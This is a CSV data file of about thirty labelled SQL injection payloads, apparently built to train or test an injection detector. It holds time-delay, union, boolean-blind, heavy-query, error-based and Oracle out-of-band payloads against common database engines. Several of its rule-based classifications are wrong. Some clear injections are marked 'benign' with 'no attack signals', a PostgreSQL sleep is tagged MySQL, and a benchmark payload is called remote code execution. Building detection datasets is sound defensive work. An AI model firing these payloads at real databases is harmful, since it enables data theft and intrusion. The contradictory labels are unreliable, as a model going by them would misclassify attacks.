row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
9390,"1"" ) ) ) and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --",1,,time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
9391,"1 ) union all select null,null,null,null,null--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
9392,"-2951"" or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) )",1,,out_of_band,oracle,0.95,utl_inaddr detected — out_of_band injection (priority 2) on oracle,rule-based
9393,"1%' ) ) union all select null,null,null,null,null,null,null,null,null#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
9394,-4644 or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) # upwd,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
9395,"1' ) ) ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( ( ( 'ochr' like 'ochr",1,,boolean_blind,generic,0.95,") and (, like ' detected — boolean_blind injection (priority 8) on generic",rule-based
9396,"1"" and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ""arqb"" like ""arqb",1,,out_of_band,oracle,0.95,utl_inaddr detected — out_of_band injection (priority 2) on oracle,rule-based
9397,"1 ) where 7978 = 7978 or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",1,,boolean_blind,generic,0.95,7978 = 7978 or detected — boolean_blind injection (priority 8) on generic,rule-based
9398,"-9977"" where 5132 = 5132 union all select 5132--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
9399,-8047' or 3038 = 3038,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
9400,"1' ) or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( 'uwbh' = 'uwbh",1,,heavy_query,generic,0.95,"select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers detected — heavy_query injection (priority 6) on generic",rule-based
9401,"1 union all select null,null,null,null,null,null,null--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
9402,1' ) ) ) and 7533 = 7533 and ( ( ( 'txex' = 'txex,1,,boolean_blind,generic,0.95,7533 = 7533 and detected — boolean_blind injection (priority 8) on generic,rule-based
9403,1 ) as duqb where 6495 = 6495,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
9404,"1' ) ) as gqzy where 2312 = 2312 or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,,heavy_query,generic,0.95,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users detected — heavy_query injection (priority 6) on generic",rule-based
9405,"1%' ) ) ) procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) and ( ( ( '%' = '",1,,rce,generic,0.95,0x52515a50 detected — rce injection (priority 1) on generic,rule-based
9406,"1' ) where 9304 = 9304 or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1,,time_blind,sqlite,0.95,randomblob ( is SQLite-specific time-delay function — time-based blind inference (priority 5),rule-based
9407,"1'|| ( select 'djoe' from dual where 8063 = 8063 ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) ) ||'",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
9408,-8553'+ ( select adko where 1750 = 1750 union all select 1750#,1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
9409,"1"" where 9792 = 9792 rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #",1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
9410,"select * from generate_series ( 8147,8147,case when ( 8147 = 6336 ) then 1 else 0 end ) limit 1--",1,,heavy_query,generic,0.95,generate_series ( detected — heavy_query injection (priority 6) on generic,rule-based
9411,"-7889"" ) ) as oayf where 1765 = 1765 or 8571 = 8571--",1,,boolean_blind,generic,0.95,1765 = 1765 or detected — boolean_blind injection (priority 8) on generic,rule-based
9412,"1'|| ( select 'mzhj' where 9677 = 9677 union all select null,null,null--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
9413,1' where 7910 = 7910,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
9414,end and ( ( ( 4675 = 4675,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
9415,select ( case when ( 9696 = 2874 ) then 1 else 9696* ( select 9696 from master..sysdatabases ) end ) --,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
9416,"1' ) ) ) and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ( 'tzrd' = 'tzrd",1,,time_blind,sqlite,0.95,randomblob ( is SQLite-specific time-delay function — time-based blind inference (priority 5),rule-based
9417,"1"" ) as ymsc where 3694 = 3694 waitfor delay '0:0:5'--",1,,time_blind,mssql,0.95,waitfor delay is MSSQL-specific time-delay function — time-based blind inference (priority 5),rule-based
9418,1'|| ( select 'npel' from dual where 5258 = 5258,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
9419,"1'+ ( select vohg where 6383 = 6383 and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) ) +'",1,,error_based,oracle,0.95,ctxsys detected — error_based injection (priority 4) on oracle,rule-based
